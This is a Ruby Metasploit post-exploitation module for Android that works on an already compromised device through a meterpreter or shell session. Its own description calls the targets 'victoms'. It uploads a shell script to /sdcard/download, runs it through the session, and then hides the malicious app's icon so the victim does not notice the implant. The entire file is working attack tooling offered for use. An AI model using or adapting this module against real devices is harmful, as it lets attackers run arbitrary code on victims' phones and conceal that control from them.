##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Android::System

  $LocalDir = "#{File.expand_path(File.dirname(__FILE__))}"
  $ScriptDir = "#{$LocalDir}/Scripts"

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'android Manage up_and_run_sh_file',
        'Description'   => %q{
          Upload script to save your victoms And
	        Run the uploaded script
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'CorrM' ],
        'Platform'      => [ 'android' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
  end

  def run
    #print_status(session.android.public_methods.join(', '))
    #return

    # Check Platform
    if !session.platform.eql?("android")
      print_error("This Script for android [ONLY].!!")
      return
    end

    # Upload
    uploadSH()
    
    sleep(1.5)

    # Run
    runSH()

    sleep(1.5)

    # Hide Icon
    session.android.hide_app_icon()
    print_good("App Icon now hidden.!")
    
    sleep(1.5)

    print_good("Bye, CorrM.")
  end

  def uploadSH
    if File.file?("#{$ScriptDir}/CorrM.sh")
      print_good("Start Uploading . . . .")    
      session.fs.file.upload_file('/sdcard/download/001.sh', "#{$ScriptDir}/CorrM.sh")
    else
      print_error("Can't Find 'CorrM.sh' !!")
    end
    print_good("File Uploaded.")
  end

  def runSH
    print_status("GoTo '/sdcard/download'.")
    shell_command("cd /sdcard/download", false)

    print_status("Run shell script :-")
    buff = shell_command("sh 001.sh", true)
    if buff.include?("No such file")
      print_error("\t" + buff)
    else
      print_good("\t" + buff)
    end
  end

  def shell_command(cmd, ret_read)
    buff = ""
    session.shell_write(cmd + "\n")
    if ret_read
      res = session.shell_read()
      buff << res if res
    end    
    buff  
  end

end
